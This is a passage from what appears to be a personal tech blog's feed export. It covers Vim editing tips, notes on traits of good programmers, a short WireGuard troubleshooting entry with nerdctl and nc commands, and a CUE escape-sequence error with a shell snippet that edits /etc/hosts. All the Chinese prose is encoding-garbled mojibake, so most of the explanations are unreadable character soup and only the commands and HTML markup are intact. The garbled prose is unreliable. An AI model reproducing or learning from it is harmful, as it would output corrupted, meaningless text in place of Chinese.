‡å‘½ä»¤è¿åŠ¨çš„å‘½ä»¤"><a href="#å’Œç§»åŠ¨å…‰æ ‡å‘½ä»¤è¿åŠ¨çš„å‘½ä»¤" class="headerlink" title="å’Œç§»åŠ¨å…‰æ ‡å‘½ä»¤è¿åŠ¨çš„å‘½ä»¤"></a>å’Œç§»åŠ¨å…‰æ ‡å‘½ä»¤è¿åŠ¨çš„å‘½ä»¤</h2><p>&lt;start position&gt;&lt;command&gt;&lt;end position&gt;</p><blockquote><p>ä¾‹å¦‚ 0y$ å‘½ä»¤æ„å‘³ç€ï¼š0 â†’ å…ˆåˆ°è¡Œå¤´  y â†’ ä»è¿™é‡Œå¼€å§‹æ‹·è´  $ â†’ æ‹·è´åˆ°æœ¬è¡Œæœ€åä¸€ä¸ªå­—ç¬¦ ä½ å¯å¯ä»¥è¾“å…¥<br>yeï¼Œä»å½“å‰ä½ç½®æ‹·è´åˆ°æœ¬å•è¯çš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚<br>ä½ ä¹Ÿå¯ä»¥è¾“å…¥ y2&#x2F;foo æ¥æ‹·è´2ä¸ª â€œfooâ€ ä¹‹é—´çš„å­—ç¬¦ä¸²ã€‚</p></blockquote><p>&lt;command&gt;æœ‰ï¼š</p><blockquote><p>yï¼ˆæ‹·è´ï¼‰<br>d (åˆ é™¤ )<br>v (å¯è§†åŒ–çš„é€‰æ‹©)<br>gU (å˜å¤§å†™)<br>gu (å˜å°å†™)</p></blockquote><p>ï¼ˆæ³¨ï¼šå¯è§†åŒ–é€‰æ‹©æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„å‘½ä»¤ï¼Œä½ å¯ä»¥å…ˆæŒ‰vï¼Œç„¶åç§»åŠ¨å…‰æ ‡ï¼Œä½ å°±ä¼šçœ‹åˆ°æ–‡æœ¬è¢«é€‰æ‹©ï¼Œç„¶åï¼Œä½ å¯èƒ½dï¼Œä¹Ÿå¯yï¼Œä¹Ÿå¯ä»¥å˜å¤§å†™ç­‰ï¼‰</p><h2 id="åœ¨å½“å‰è¡Œä¸Šç§»åŠ¨å…‰æ ‡-0-f-F-t-T"><a href="#åœ¨å½“å‰è¡Œä¸Šç§»åŠ¨å…‰æ ‡-0-f-F-t-T" class="headerlink" title="åœ¨å½“å‰è¡Œä¸Šç§»åŠ¨å…‰æ ‡: 0 ^ $ f F t T ,"></a>åœ¨å½“å‰è¡Œä¸Šç§»åŠ¨å…‰æ ‡: 0 ^ $ f F t T ,</h2><blockquote><p>0 â†’ åˆ°è¡Œå¤´<br>^ â†’ åˆ°æœ¬è¡Œçš„ç¬¬ä¸€ä¸ªéblankå­—ç¬¦<br>$ â†’ åˆ°è¡Œå°¾<br>g_ â†’ åˆ°æœ¬è¡Œæœ€åä¸€ä¸ªä¸æ˜¯blankå­—ç¬¦çš„ä½ç½®ã€‚<br>fa â†’ åˆ°ä¸‹ä¸€ä¸ªä¸ºaçš„å­—ç¬¦å¤„ï¼Œä½ ä¹Ÿå¯ä»¥fsåˆ°ä¸‹ä¸€ä¸ªä¸ºsçš„å­—ç¬¦ã€‚<br>t, â†’ åˆ°é€—å·å‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚é€—å·å¯ä»¥å˜æˆå…¶å®ƒå­—ç¬¦ã€‚<br>3fa â†’ åœ¨å½“å‰è¡ŒæŸ¥æ‰¾ç¬¬ä¸‰ä¸ªå‡ºç°çš„aã€‚<br>F å’Œ T â†’ å’Œ f å’Œ t ä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯ç›¸åæ–¹å‘ã€‚</p></blockquote><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„å‘½ä»¤æ˜¯ dtâ€ â†’ åˆ é™¤æ‰€æœ‰çš„å†…å®¹ï¼Œç›´åˆ°é‡åˆ°åŒå¼•å·â€”â€” â€œã€‚</p><h2 id="åŒºåŸŸé€‰æ‹©"><a href="#åŒºåŸŸé€‰æ‹©" class="headerlink" title="åŒºåŸŸé€‰æ‹©"></a>åŒºåŸŸé€‰æ‹©</h2><p>åœ¨visual æ¨¡å¼ä¸‹ï¼Œè¿™äº›å‘½ä»¤å¾ˆå¼ºå¤§ï¼Œå…¶å‘½ä»¤æ ¼å¼ä¸ºï¼š&lt;action&gt;a&lt;object&gt; å’Œ &lt;action&gt;i&lt;object&gt;</p><p>actionå¯ä»¥æ˜¯ä»»ä½•çš„å‘½ä»¤ï¼Œå¦‚ d (åˆ é™¤), y (æ‹·è´), v (å¯ä»¥è§†æ¨¡å¼é€‰æ‹©)ã€‚</p><p>objectä¸ºæ–‡æœ¬å¯¹è±¡ï¼šVimæŠŠæ–‡æœ¬å¯¹è±¡åˆ†ä¸ºäº†ä¸¤ç±» ï¼Œä¸€ç±»æ˜¯å—æ–‡æœ¬å¯¹è±¡ï¼Œå¦ä¸€ç±»æ˜¯éå—æ–‡æœ¬å¯¹è±¡ã€‚</p><p><a href="https://blog.csdn.net/zwlove5280/article/details/108264265">Vimæ–‡æœ¬å¯¹è±¡å‚è€ƒ</a></p><h3 id="éå—æ–‡æœ¬å¯¹è±¡"><a href="#éå—æ–‡æœ¬å¯¹è±¡" class="headerlink" title="éå—æ–‡æœ¬å¯¹è±¡"></a>éå—æ–‡æœ¬å¯¹è±¡</h3><table><thead><tr><th align="left">éå—æ–‡æœ¬å¯¹è±¡</th><th align="left">è¯´æ˜</th><th align="left">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="left">aw</td><td align="left">å½“å‰å•è¯åŠå•è¯å‰é¢æˆ–è€…åé¢çš„ç©ºæ ¼</td><td align="left">wè¡¨ç¤ºword(å•è¯)<br>awæ˜¯åŒ…å«ä¸€ä¸ªç©ºæ ¼çš„ï¼Œå¦‚æœå•è¯åé¢æœ‰ç©ºæ ¼ï¼Œé‚£ä¹ˆawåŒ…å«çš„å°±æ˜¯åé¢çš„ç©ºæ ¼ï¼Œå¦åˆ™åŒ…å«çš„æ˜¯å‰é¢çš„ç©ºæ ¼ã€‚</td></tr><tr><td align="left">iw</td><td align="left">å½“å‰å•è¯</td><td align="left">iwæ˜¯ä¸åŒ…å«ç©ºæ ¼çš„</td></tr><tr><td align="left">aW</td><td align="left">å½“å‰å­—ä¸²åŠå­—ä¸²å‰é¢æˆ–è€…åé¢çš„ç©ºæ ¼</td><td align="left">Wè¡¨ç¤ºWORD(å­—ä¸²)</td></tr><tr><td align="left">iW</td><td align="left">å½“å‰å­—ä¸²</td><td align="left"></td></tr><tr><td align="left">as</td><td align="left">å½“å‰å¥å­åŠå¥å­å‰é¢æˆ–åé¢çš„ç©ºæ ¼</td><td align="left">sè¡¨ç¤ºsentence(å¥å­)</td></tr><tr><td align="left">is</td><td align="left">å½“å‰å¥å­</td><td align="left"></td></tr><tr><td align="left">ap</td><td align="left">å½“å‰æ®µè½åŠæ®µè½å‰é¢æˆ–åé¢çš„ç©ºè¡Œ</td><td align="left">pè¡¨ç¤ºparagraph(æ®µè½)</td></tr><tr><td align="left">ip</td><td align="left">å½“å‰æ®µè½</td><td align="left"></td></tr><tr><td align="left">æ–‡æœ¬å¯¹è±¡éƒ½æ˜¯ä»¥aæˆ–è€…iå¼€å¤´ï¼Œå®ƒä»¬çš„åŒºåˆ«åœ¨äºæ˜¯å¦åŒ…å«ç©ºæ ¼æˆ–è€…ç©ºè¡Œã€‚</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><font color=red>è¾…åŠ©è®°å¿†ï¼šæˆ‘ä»¬å¯ä»¥æŠŠaç†è§£ä¸ºaroundï¼ŒæŠŠiç†è§£ä¸ºinnerã€‚</font></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="å—æ–‡æœ¬å¯¹è±¡"><a href="#å—æ–‡æœ¬å¯¹è±¡" class="headerlink" title="å—æ–‡æœ¬å¯¹è±¡"></a>å—æ–‡æœ¬å¯¹è±¡</h3><p>å—æ–‡æœ¬å¯¹è±¡åº”è¯¥å°±æ˜¯è¢«æˆå¯¹çš„ç¬¦å·åˆ†éš”çš„æ–‡æœ¬å¯¹è±¡ã€‚</p><p>ä¾‹å¦‚â€Hello World!â€ï¼Œå°±æ˜¯ä¸€ä¸ªå—æ–‡æœ¬å¯¹è±¡ï¼Œæ–‡æœ¬è¢«ä¸€å¯¹åŒå¼•å·åŒ…å«ï¼ŒåŒç†&lt;h1&gt;æ ‡é¢˜&lt;&#x2F;h1&gt;ä¹Ÿå°±ä¸€ä¸ªå—æ–‡æœ¬å¯¹è±¡ï¼Œå®ƒè¢«ä¸€å¯¹æ ‡ç­¾æ‰€åŒ…å›´ã€‚</p><p>æˆå¯¹çš„åˆ†éš”ç¬¦åŒ…æ‹¬ å°ã€ä¸­ã€å¤§æ‹¬å·ï¼ŒåŒå¼•å·ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œä»¥åŠHTMLä¸­çš„æ ‡ç­¾ã€‚</p><p><font color=red>å¦‚æœå—æ–‡æœ¬å¯¹è±¡å‘½ä»¤ä»¥aå¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬æˆå¯¹çš„åˆ†éš”ç¬¦ï¼Œå¦‚æœä»¥iå¼€å¤´ï¼Œåˆ™ä¸åŒ…å«ã€‚</font></p><h3 id="åˆ é™¤ä¸€ä¸ªå•è¯"><a href="#åˆ é™¤ä¸€ä¸ªå•è¯" class="headerlink" title="åˆ é™¤ä¸€ä¸ªå•è¯"></a>åˆ é™¤ä¸€ä¸ªå•è¯</h3><p>åˆ é™¤ä¸€ä¸ªå•è¯ï¼Œæˆ‘ä»¬å¯èƒ½æŠŠå…‰æ ‡ç§»åŠ¨åˆ°å•è¯çš„å¼€å¤´ï¼Œç„¶åä½¿ç”¨dwåˆ é™¤ã€‚è¿™è¦æ±‚å…‰æ ‡å¿…é¡»å…ˆç§»åŠ¨åˆ°å•è¯çš„å¼€å¤´ã€‚</p><p>å¦‚æœä½¿ç”¨dawåˆ é™¤ä¸€ä¸ªå•è¯å‘¢ï¼Œåªè¦å…‰æ ‡åœ¨å•è¯ä¸Šä»»æ„ä½ç½®æˆ–è€…åœ¨å•è¯å‰é¢çš„ç©ºæ ¼ä¸Šï¼Œå°±èƒ½ä½¿ç”¨dawåˆ é™¤ä¸€ä¸ªå•è¯ã€‚</p><h3 id="åŒºåŸŸé€‰æ‹©ç¤ºä¾‹"><a href="#åŒºåŸŸé€‰æ‹©ç¤ºä¾‹" class="headerlink" title="åŒºåŸŸé€‰æ‹©ç¤ºä¾‹"></a>åŒºåŸŸé€‰æ‹©ç¤ºä¾‹</h3><blockquote><p>ä¸¾ä¾‹ï¼šå‡è®¾ä½ æœ‰ä¸€ä¸ªå­—ç¬¦ä¸² (map (+) (â€œfooâ€)).è€Œå…‰æ ‡é”®åœ¨ç¬¬ä¸€ä¸ª o çš„ä½ç½®ã€‚<br>viâ€ â†’ ä¼šé€‰æ‹© foo.<br>vaâ€ â†’ ä¼šé€‰æ‹© â€œfooâ€.<br>vi) â†’ ä¼šé€‰æ‹© â€œfooâ€.<br>va) â†’ ä¼šé€‰æ‹©(â€œfooâ€).<br>v2i) â†’ ä¼šé€‰æ‹© map (+) (â€œfooâ€)<br>v2a) â†’ ä¼šé€‰æ‹© (map (+) (â€œfooâ€))</p></blockquote><h2 id="å—æ“ä½œ"><a href="#å—æ“ä½œ" class="headerlink" title="å—æ“ä½œ: "></a>å—æ“ä½œ: <C-v></h2><p>å—æ“ä½œï¼Œå…¸å‹çš„æ“ä½œï¼š 0 &lt;C-v&gt; &lt;C-d&gt; Iâ€“ [ESC]</p><blockquote><p>^ â†’ åˆ°è¡Œå¤´<br><C-v> â†’ å¼€å§‹å—æ“ä½œ<br><C-d> â†’ å‘ä¸‹ç§»åŠ¨ (ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨hjklæ¥ç§»åŠ¨å…‰æ ‡ï¼Œæˆ–æ˜¯ä½¿ç”¨%ï¼Œæˆ–æ˜¯åˆ«çš„)<br>Iâ€“ [ESC] â†’ Iæ˜¯æ’å…¥ï¼Œæ’å…¥â€œâ€“â€ï¼ŒæŒ‰ESCé”®æ¥ä¸ºæ¯ä¸€è¡Œç”Ÿæ•ˆã€‚</p></blockquote><p>åœ¨Windowsä¸‹çš„vimï¼Œä½ éœ€è¦ä½¿ç”¨ <C-q> è€Œä¸æ˜¯ <C-v> ï¼Œ<C-v> æ˜¯æ‹·è´å‰ªè´´æ¿ã€‚</p><h2 id="è‡ªåŠ¨æç¤ºï¼š-lt-C-n-gt-å’Œ-lt-C-p-gt"><a href="#è‡ªåŠ¨æç¤ºï¼š-lt-C-n-gt-å’Œ-lt-C-p-gt" class="headerlink" title="è‡ªåŠ¨æç¤ºï¼š&lt;C-n&gt; å’Œ &lt;C-p&gt;"></a>è‡ªåŠ¨æç¤ºï¼š&lt;C-n&gt; å’Œ &lt;C-p&gt;</h2><p>åœ¨ Insert æ¨¡å¼ä¸‹ï¼Œä½ å¯ä»¥è¾“å…¥ä¸€ä¸ªè¯çš„å¼€å¤´ï¼Œç„¶åæŒ‰ &lt;C-p&gt;æˆ–æ˜¯&lt;C-n&gt;ï¼Œè‡ªåŠ¨è¡¥é½åŠŸèƒ½å°±å‡ºç°äº†â€¦â€¦</p><h2 id="å®å½•åˆ¶ï¼š-qa-æ“ä½œåºåˆ—-q-a"><a href="#å®å½•åˆ¶ï¼š-qa-æ“ä½œåºåˆ—-q-a" class="headerlink" title="å®å½•åˆ¶ï¼š qa æ“ä½œåºåˆ— q, @a, @@"></a>å®å½•åˆ¶ï¼š qa æ“ä½œåºåˆ— q, @a, @@</h2><p>qa æŠŠä½ çš„æ“ä½œè®°å½•åœ¨å¯„å­˜å™¨ aã€‚<br>äºæ˜¯ @a ä¼šreplayè¢«å½•åˆ¶çš„å®ã€‚<br>@@ æ˜¯ä¸€ä¸ªå¿«æ·é”®ç”¨æ¥replayæœ€æ–°å½•åˆ¶çš„å®ã€‚</p><blockquote><p>ç¤ºä¾‹<br>åœ¨ä¸€ä¸ªåªæœ‰ä¸€è¡Œä¸”è¿™ä¸€è¡Œåªæœ‰â€œ1â€çš„æ–‡æœ¬ä¸­ï¼Œé”®å…¥å¦‚ä¸‹å‘½ä»¤ï¼š<br>qaYp&lt;C-a&gt;qâ†’<br>qa å¼€å§‹å½•åˆ¶<br>Yp å¤åˆ¶è¡Œ.<br>&lt;C-a&gt; å¢åŠ 1.<br>q åœæ­¢å½•åˆ¶.<br>@a â†’ åœ¨1ä¸‹é¢å†™ä¸‹ 2<br>@@ â†’ åœ¨2 æ­£é¢å†™ä¸‹3<br>ç°åœ¨åš 100@@ ä¼šåˆ›å»ºæ–°çš„100è¡Œï¼Œå¹¶æŠŠæ•°æ®å¢åŠ åˆ° 103.</p></blockquote><h2 id="å¯è§†åŒ–é€‰æ‹©ï¼š-v-V-lt-C-v-gt"><a href="#å¯è§†åŒ–é€‰æ‹©ï¼š-v-V-lt-C-v-gt" class="headerlink" title="å¯è§†åŒ–é€‰æ‹©ï¼š v,V,&lt;C-v&gt;"></a>å¯è§†åŒ–é€‰æ‹©ï¼š v,V,&lt;C-v&gt;</h2><p>å‰é¢ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† &lt;C-v&gt;çš„ç¤ºä¾‹ ï¼ˆåœ¨Windowsä¸‹åº”è¯¥æ˜¯&lt;C-q&gt;ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ v å’Œ Vã€‚</p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">v</td><td align="left">å­—ç¬¦é€‰æ‹©ï¼Œå°†å…‰æ ‡ç»è¿‡çš„å­—ç¬¦é€‰æ‹©</td></tr><tr><td align="left">V</td><td align="left">è¡Œé€‰æ‹©ï¼Œå°†å…‰æ ‡ç»è¿‡çš„è¡Œé€‰æ‹©</td></tr><tr><td align="left">[Ctrl]+v</td><td align="left">çŸ©å½¢é€‰æ‹©ï¼Œå¯ä»¥ç”¨çŸ©å½¢çš„æ–¹å¼é€‰æ‹©æ•°æ®</td></tr></tbody></table><p>ä¸€ä½†è¢«é€‰å¥½äº†ï¼Œä½ å¯ä»¥åšä¸‹é¢çš„äº‹ï¼š</p><p>J â†’ æŠŠæ‰€æœ‰çš„è¡Œè¿æ¥èµ·æ¥ï¼ˆå˜æˆä¸€è¡Œï¼‰<br>&lt; æˆ– &gt; â†’ å·¦å³ç¼©è¿›<br>&#x3D; â†’ è‡ªåŠ¨ç»™ç¼©è¿› ï¼ˆæ³¨ï¼šè¿™ä¸ªåŠŸèƒ½ç›¸å½“å¼ºå¤§ï¼Œæˆ‘å¤ªå–œæ¬¢äº†ï¼‰</p><blockquote><p>ç¤ºä¾‹ï¼šåœ¨æ‰€æœ‰è¢«é€‰æ‹©çš„è¡ŒååŠ ä¸Šç‚¹ä¸œè¥¿ï¼š<br>&lt;C-v&gt;<br>é€‰ä¸­ç›¸å…³çš„è¡Œ (å¯ä½¿ç”¨ j æˆ– &lt;C-d&gt; æˆ–æ˜¯ &#x2F;pattern æˆ–æ˜¯ % ç­‰â€¦â€¦)<br>$ åˆ°è¡Œæœ€å<br>A, è¾“å…¥å­—ç¬¦ä¸²ï¼ŒæŒ‰ ESCã€‚</p></blockquote><h2 id="åˆ†å±-split-å’Œ-vsplit"><a href="#åˆ†å±-split-å’Œ-vsplit" class="headerlink" title="åˆ†å±: :split å’Œ vsplit."></a>åˆ†å±: :split å’Œ vsplit.</h2><p>ä¸‹é¢æ˜¯ä¸»è¦çš„å‘½ä»¤ï¼Œä½ å¯ä»¥ä½¿ç”¨VIMçš„å¸®åŠ© :help split. ä½ å¯ä»¥å‚è€ƒ <a href="https://coolshell.cn/articles/1679.html">VIMåˆ†å±</a>ã€‚</p><blockquote><p>:split â†’ åˆ›å»ºåˆ†å± (:vsplitåˆ›å»ºå‚ç›´åˆ†å±)<br>&lt;C-w&gt;&lt;dir&gt; : dirå°±æ˜¯æ–¹å‘ï¼Œå¯ä»¥æ˜¯ hjkl æˆ–æ˜¯ â†â†“â†‘â†’ ä¸­çš„ä¸€ä¸ªï¼Œå…¶ç”¨æ¥åˆ‡æ¢åˆ†å±ã€‚<br>&lt;C-w&gt;_ (æˆ– &lt;C-w&gt;|) : æœ€å¤§åŒ–å°ºå¯¸ (<C-w>| å‚ç›´åˆ†å±)<br>&lt;C-w&gt;+ (æˆ–&lt;C-w&gt;-) : å¢åŠ å°ºå¯¸</p></blockquote><h2 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h2><p>å…¶ä¸­å…³äºvimçš„ä¸€äº›å¯è§†åŒ–çš„ä¾‹å­åœ¨ä¸‹é¢çš„å‚è€ƒå­¦ä¹ é“¾æ¥é‡Œ</p><p><a href="https://www.cnblogs.com/hxf-changmylife/p/5918052.html">å‚è€ƒå­¦ä¹ é“¾æ¥</a><br><a href="https://blog.csdn.net/niushuai666/article/details/7275406">å‚è€ƒå­¦ä¹ é“¾æ¥</a></p><p>vimå­¦ä¹ åˆ°æ­¤ç»“æŸï¼Œä¸€å®šè¦å¤šåŠ ç»ƒä¹ å‘€ï¼</p><h1 id="2021-03-30è¡¥å……"><a href="#2021-03-30è¡¥å……" class="headerlink" title="2021.03.30è¡¥å……"></a>2021.03.30è¡¥å……</h1><h2 id="æ˜¾ç¤ºç©ºç™½å­—ç¬¦"><a href="#æ˜¾ç¤ºç©ºç™½å­—ç¬¦" class="headerlink" title="æ˜¾ç¤ºç©ºç™½å­—ç¬¦"></a>æ˜¾ç¤ºç©ºç™½å­—ç¬¦</h2><p>è¿›å…¥ vim åï¼Œåœ¨æ™®é€šæ¨¡å¼ä¸‹æŒ‰å†’å·(:)ï¼Œä¼šåœ¨æœ€ä¸‹ä¸€è¡Œå‡ºç°å†’å·ï¼Œå¹¶å¯ä»¥å¼€å§‹æ‰“å­—ã€‚è¾“å…¥ï¼š</p><blockquote><p>:set list</p></blockquote><p>åå›è½¦ï¼Œå°±å¯ä»¥äº†ã€‚<font color=red>list æ‰“å¼€åï¼Œè¡Œå°¾ã€åˆ¶è¡¨ç¬¦ç­‰ç©ºç™½å­—ç¬¦éƒ½ä¼šç”¨ç‰¹æ®Šç¬¦å·æ˜¾ç¤ºå‡ºæ¥ã€‚</font><br>å¦‚æœæƒ³å…³é—­ï¼Œå°±è¾“å…¥ï¼š</p><blockquote><p>:set nolist</p></blockquote><h1 id="2023-08-09-ä¸‰"><a href="#2023-08-09-ä¸‰" class="headerlink" title="2023.08.09(ä¸‰)"></a>2023.08.09(ä¸‰)</h1><h2 id="å„ç§åˆ é™¤"><a href="#å„ç§åˆ é™¤" class="headerlink" title="å„ç§åˆ é™¤"></a>å„ç§åˆ é™¤</h2><p>æ™®é€šæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œæ¨¡å¼ï¼‰ï¼ˆæŒ‰äº†ESCï¼‰ä¸‹ï¼š<br>dd â†’ åˆ é™¤å½“å‰è¡Œï¼Œå¹¶æŠŠåˆ é™¤çš„è¡Œå­˜åˆ°å‰ªè´´æ¿é‡Œ (è¾…åŠ©è®°å¿†ï¼šdelete)<br>2dd  â†’ åˆ é™¤ä»å½“å‰è¡Œå¼€å§‹çš„æ¥ä¸‹æ¥ä¸¤è¡Œ<br>è¾“å…¥:3,5dï¼ŒæŒ‰Enteré”® â†’ è¦åˆ é™¤ä»3åˆ°5çš„è¡Œ<br>è¾“å…¥:.,$d  â†’  åˆ é™¤ä»å½“å‰è¡Œåˆ°æ–‡ä»¶æœ«å°¾<br>è¾“å…¥:.,1d  â†’  åˆ é™¤ä»å½“å‰è¡Œåˆ°æ–‡ä»¶å¼€å¤´<br>è¾“å…¥:%dï¼ŒæŒ‰enteré”® â†’ åˆ é™¤æ‰€æœ‰è¡Œ</p><p>.ï¼ˆç‚¹ï¼‰  â†’  å½“å‰è¡Œ<br>$   â†’  æœ€åä¸€è¡Œ<br>%  â†’  æ‰€æœ‰è¡Œ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¼˜ç§€ç¨‹åºå‘˜çš„å…±æ€§ç‰¹å¾-review</title>
    <link href="/2024/01/02/code/%E4%BC%98%E7%A7%80%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%85%B1%E6%80%A7%E7%89%B9%E5%BE%81-review/"/>
    <url>/2024/01/02/code/%E4%BC%98%E7%A7%80%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%85%B1%E6%80%A7%E7%89%B9%E5%BE%81-review/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.toutiao.com/article/7315361744254861874/?app=news_article&timestamp=1703474209&use_new_style=1&req_id=20231225111648F919B5981AB74F493147&group_id=7315361744254861874&wxshare_count=1&tt_from=weixin&utm_source=weixin&utm_medium=toutiao_android&utm_campaign=client_share&share_token=05f0881f-b2b2-4fc4-98f4-41c189c55d13&source=m_redirect&wid=1704176093219">è…¾è®¯å·¥ä½œ13å¹´ä¹‹æ‰€æ€æ‰€æƒ³ï¼Œé‚£äº›ä¼˜ç§€ç¨‹åºå‘˜çš„å…±æ€§ç‰¹å¾-ä»Šæ—¥å¤´æ¡ (toutiao.com)</a></p><p><strong>åæ‰§</strong><br>å¯¹äºä¸€ä¸ªæ–¹æ¡ˆï¼Œä¸€ä¸ªå®ç°ï¼Œè¯·ä¸è¦è¯´å‡ºâ€œå¥½åƒè¿™æ ·ä¹Ÿå¯ä»¥â€ã€‚ä½ ä¸€å®šè¦é€‰å‡ºä¸€ä¸ªæ›´å¥½çš„åšæ³•ï¼Œå¹¶ä¸”ä¸€ç›´åšæŒè¿™ä¸ªåšæ³•ï¼Œå¹¶ä¸”è¦æ±‚åˆ«äººä¹Ÿè¿™æ ·åšã€‚</p><p><strong>æ§åˆ¶è½¯ä»¶çš„ç†µ</strong></p><p><strong>ä¸ºæµ‹è¯•åšè®¾è®¡</strong><br>ä»¥åŠï¼Œå¦‚æœæ²¡æœ‰å¼ºå¤§çš„å¤–éƒ¨é©±åŠ¨åŠ›ï¼Œâ€œä»¥åå†æµ‹â€å®é™…ä¸Šæ„å‘³ç€â€œæ°¸è¿œä¸æµ‹â€ã€‚å¤§å®¶åŠ¡å®ä¸€ç‚¹ï¼Œåœ¨ç¼–ç æ—¶å°±è€ƒè™‘æ€ä¹ˆæµ‹è¯•ã€‚ä¸ç„¶ï¼Œä½ æ°¸è¿œæ²¡æœ‰æœºä¼šè€ƒè™‘äº†ã€‚å½“é¢å¯¹ç€æµ‹è¯•æ€§ä½çš„ä»£ç ï¼Œéœ€è¦ç¼–å†™è‡ªåŠ¨åŒ–æµ‹è¯•çš„æ—¶å€™ï¼Œä½ ä¼šæ„Ÿè§‰å¾ˆéš¾å—ã€‚</p><p><strong>å°½æ—©æµ‹è¯•, ç»å¸¸æµ‹è¯•, è‡ªåŠ¨æµ‹è¯•</strong></p><p>ä¸€æ—¦ä»£ç å†™å‡ºæ¥ï¼Œå°±è¦å°½æ—©å¼€å§‹æµ‹è¯•ã€‚è¿™äº›å°é±¼çš„æ¶å¿ƒä¹‹å¤„åœ¨äºï¼Œå®ƒä»¬å¾ˆå¿«å°±ä¼šå˜æˆå·¨å¤§çš„é£Ÿäººé²¨ï¼Œè€Œæ•æ‰é²¨é±¼åˆ™ç›¸å½“å›°éš¾ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å†™å•å…ƒæµ‹è¯•ï¼Œå†™å¾ˆå¤šå•å…ƒæµ‹è¯•ã€‚</p><p><strong>é¡¹ç›®ä¸­ä½¿ç”¨ç»Ÿä¸€çš„æœ¯è¯­</strong></p><p><strong>ä¸è¦é¢å‘éœ€æ±‚ç¼–ç¨‹</strong></p><p><strong>å†™ä»£ç è¦æœ‰å¯¹äºâ€œç¾â€çš„è¿½æ±‚</strong></p><p><strong>åº”ç”¨ç¨‹åºæ¡†æ¶æ˜¯å®ç°ç»†èŠ‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wireguard</title>
    <link href="/2023/12/13/net/wireguard/"/>
    <url>/2023/12/13/net/wireguard/</url>
    
    <content type="html"><![CDATA[<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nerdctl ps<br>nerdctl logs containerID/<span class="hljs-type">NAME</span><br>nerdctl <span class="hljs-keyword">restart</span> containerID/<span class="hljs-type">NAME</span><br><br>ip a <span class="hljs-keyword">show</span> wg0<br><br>nc -vz -w3 <span class="hljs-number">240.2</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202403) unknown escape sequence</title>
    <link href="/2023/11/16/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20unknown%20escape%20sequence/"/>
    <url>/2023/11/16/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20unknown%20escape%20sequence/</url>
    
    <content type="html"><![CDATA[<h1 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-literal">unknown</span> <span class="hljs-keyword">escape</span> sequence:<br>    <span class="hljs-operator">-</span>:<span class="hljs-number">16</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">global: &#123;<br>    <span class="hljs-built_in">test</span>: <span class="hljs-string">&quot;111&quot;</span><br>&#125;<br><br>data: <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">\(global.test)</span><br><span class="hljs-string">#!/bin/sh</span><br><span class="hljs-string">echo -e &quot;</span>\n è¿½åŠ é•œåƒä»“åº“æ˜ å°„åˆ°/etc/hostsæ–‡ä»¶ <span class="hljs-string">&quot;</span><br><span class="hljs-string"># è¦æ£€æŸ¥å¹¶è¿½åŠ çš„IPå’Œä¸»æœºå  </span><br><span class="hljs-string">IP=&quot;</span>1.1.1.1<span class="hljs-string">&quot;  </span><br><span class="hljs-string">HOSTNAME=&quot;</span>abc<span class="hljs-string">&quot;  </span><br><span class="hljs-string"># è¦æœç´¢çš„å­—ç¬¦ä¸²  </span><br><span class="hljs-string">search_string=&quot;</span><span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span><span class="hljs-string">&quot;  </span><br><span class="hljs-string"></span><br><span class="hljs-string"># 